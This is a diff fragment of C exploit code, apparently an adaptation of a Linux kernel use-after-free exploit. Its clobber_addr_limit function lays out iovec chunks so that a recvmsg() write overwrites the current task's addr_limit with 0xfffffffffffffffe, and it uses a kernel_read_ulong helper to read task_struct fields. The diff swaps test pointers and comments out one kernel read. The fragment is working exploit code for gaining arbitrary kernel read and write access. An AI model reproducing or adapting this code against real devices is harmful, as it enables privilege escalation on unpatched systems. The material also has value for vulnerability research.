@@ -176,17 +176,17 @@ void clobber_addr_limit(void)
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
     sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
-    &testDatum, //&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
-    8, /* next iov_len (sizeof(addr_limit)) */
     &testDatum2, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    8, /* next iov_len (sizeof(addr_limit)) */
+    &testDatum, //&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
   memcpy(testFill, second_write_chunk, sizeof(second_write_chunk));
   
   printf("offset %lx\n", sizeof(testFill));
   unsigned long third_write_chunk[] = {
-    0xfffffffffffffffe, /* value to write over addr_limit */
     0xABCDEF0123456789, /* value to write over addr_limit */
+    0xfffffffffffffffe, /* value to write over addr_limit */
   };
   
   int initialSize = 4096*17 - UAF_SPINLOCK-sizeof(testFill);
@@ -280,8 +280,8 @@ void clobber_addr_limit(void)
   printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
       totalLength);
  // sleep(2);
-  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
-  printf("current->mm == 0x%lx\n", current_mm);
+//  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
+//  printf("current->mm == 0x%lx\n", current_mm);
 }
 
 int kernel_rw_pipe[2];
